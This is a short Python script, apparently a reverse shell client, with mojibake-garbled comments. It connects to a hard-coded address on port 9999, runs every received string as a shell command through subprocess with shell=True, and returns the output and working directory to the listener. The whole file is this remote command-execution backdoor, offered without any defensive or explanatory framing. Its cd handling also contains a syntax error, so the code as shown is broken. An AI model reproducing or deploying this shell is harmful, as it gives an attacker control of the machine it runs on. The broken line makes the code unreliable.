import socket
import sys, os
import subprocess
 
#���Ͻ����� ��������
s = socket.socket()
 
#����pc�� ip�Ҵ�(�� ip�� Ŭ���̾�Ʈ�� ã�ƿ��� ��)
host = '192.168.0.3'
port = 9999
s.connect((host, port))
 
while True: #���� ����� ���ѷ���
    data = s.recv(2048) #���� ���ۻ����� ���ϰ� data������ ���
    if data[:2].decode("utf-8") == 'cd': #CLI���� ù �α��� cd�� ��
        os.chdir(data[3:]).decode("utf-8"))
    if len(data) > 0: #������ ���� �ʰ���
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)#���̽㿡�� ����ũ��Ʈ© �� ����ϴ� subprocess��� �̿��� ���ϰ���  cmd����
        output_bytes = cmd.stdout.read() + cmd.stderr.read() #ǥ����°� ������������. (������Ʈ��)
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '>'))#client���� �� ������ ������
        print(output_str)#Test
s.close()
